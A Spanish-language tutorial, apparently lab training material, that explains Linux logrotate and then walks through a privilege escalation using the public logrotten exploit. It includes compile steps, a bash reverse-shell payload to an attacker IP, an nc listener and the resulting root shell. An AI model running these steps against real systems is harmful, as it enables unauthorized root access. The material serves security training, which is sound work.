Cada sistema Linux produce grandes cantidades de archivos de registro (log files). Para evitar que el disco duro se llene, una herramienta llamada `logrotate` se encarga de archivar o eliminar los logs antiguos. Si no se presta atención a los archivos de registro, estos se vuelven más y más grandes y eventualmente ocupan todo el espacio disponible en el disco. Además, buscar en muchos archivos de registro grandes es una tarea que consume mucho tiempo. Para evitar esto y ahorrar espacio en disco, se ha desarrollado `logrotate`. Los logs en `/var/log` dan a los administradores la información que necesitan para determinar la causa detrás de los malfuncionamientos. Casi más importantes son los detalles del sistema no notados, como si todos los servicios están funcionando correctamente.

`Logrotate` tiene muchas características para gestionar estos archivos de registro. Estas incluyen la especificación de:

- el `size` (tamaño) del archivo de registro,
- su `age` (edad),
- y la `action` (acción) a tomar cuando se alcanza uno de estos factores.

```r
man logrotate
# or
logrotate --help

Usage: logrotate [OPTION...] <configfile>
  -d, --debug               Don't do anything, just test and print debug messages
  -f, --force               Force file rotation
  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')
  -s, --state=statefile     Path of state file
      --skip-state-lock     Do not lock the state file
  -v, --verbose             Display messages during rotation
  -l, --log=logfile         Log file or 'syslog' to log to syslog
      --version             Display version information

Help options:
  -?, --help                Show this help message
      --usage               Display brief usage message
```

La función de la rotación en sí consiste en renombrar los archivos de registro. Por ejemplo, se pueden crear nuevos archivos de registro para cada nuevo día, y los más antiguos se renombrarán automáticamente. Otro ejemplo de esto sería vaciar el archivo de registro más antiguo y así reducir el consumo de memoria.

Esta herramienta suele iniciarse periódicamente a través de `cron` y se controla a través del archivo de configuración `/etc/logrotate.conf`. Dentro de este archivo, contiene configuraciones globales que determinan la función de `logrotate`.

```r
cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

Para forzar una nueva rotación el mismo día, podemos establecer la fecha después de los archivos de registro individuales en el archivo de estado `/var/lib/logrotate.status` o usar la opción `-f`/`--force`.

```r
sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

Podemos encontrar los archivos de configuración correspondientes en el directorio `/etc/logrotate.d/`.

```r
ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```r
cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

Para explotar `logrotate`, necesitamos cumplir algunos requisitos.

1. Necesitamos permisos de `write` (escritura) en los archivos de registro.
2. `Logrotate` debe ejecutarse como un usuario privilegiado o `root`.
3. Versiones vulnerables:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

Hay un exploit prefabricado que podemos usar si se cumplen los requisitos. Este exploit se llama [logrotten](https://github.com/whotwagner/logrotten). Podemos descargarlo y compilarlo en un kernel similar al del sistema objetivo y luego transferirlo al sistema objetivo. Alternativamente, si podemos compilar el código en el sistema objetivo, entonces podemos hacerlo directamente en el sistema objetivo.

```r
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

A continuación, necesitamos un payload para ejecutar. Aquí tenemos muchas opciones diferentes disponibles que podemos usar. En este ejemplo, ejecutaremos un simple reverse shell basado en bash con la `IP` y el `port` de nuestra VM que usamos para atacar el sistema objetivo.

```r
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

Sin embargo, antes de ejecutar el exploit, necesitamos determinar qué opción usa `logrotate` en `logrotate.conf`.

```r
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

En nuestro caso, es la opción: `create`. Por lo tanto, tenemos que usar el exploit adaptado a esta función.

Después de eso, tenemos que iniciar un listener en nuestra VM / Pwnbox, que espera la conexión del sistema objetivo.

```r
nc -nlvp 9001

Listening on 0.0.0.0 9001
```

Como paso final, ejecutamos el exploit con el payload preparado y esperamos un reverse shell como usuario privilegiado o root.

```r
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

```r
...
Listening on 0.0.0.0 9001

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```